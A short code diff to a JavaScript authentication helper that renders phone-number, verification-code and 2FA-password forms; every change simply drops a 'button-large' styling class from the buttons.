@@ -142,7 +142,7 @@ class AuthHelper {
       <div class="auth-form">
         <label>📱 Enter your phone number:</label>
         <input type="text" id="phone-input" placeholder="+1234567890" />
-        <button class="button button-large" onclick="submitPhone()">Send Code</button>
+        <button class="button" onclick="submitPhone()">Send Code</button>
         <div class="auth-footer">
           <p class="legal-text">
             By continuing, you agree to our <a href="#">Terms</a> and <a href="#">Privacy Policy</a>
@@ -161,7 +161,7 @@ class AuthHelper {
         <p>📨 Code sent to <strong>${phone}</strong></p>
         <label>💬 Enter the code:</label>
         <input type="text" id="code-input" placeholder="12345" />
-        <button class="button button-large" onclick="submitCode('${userId}', '${phone}')">Verify</button>
+        <button class="button" onclick="submitCode('${userId}', '${phone}')">Verify</button>
       </div>
     `;
     container.style.display = "block";
@@ -173,7 +173,7 @@ class AuthHelper {
       <div class="auth-form">
         <label>🔒 Enter your 2FA password:</label>
         <input type="password" id="password-input" />
-        <button class="button button-large" onclick="submitPassword('${phone}', '${code}')">Verify</button>
+        <button class="button" onclick="submitPassword('${phone}', '${code}')">Verify</button>
       </div>
     `;
   }
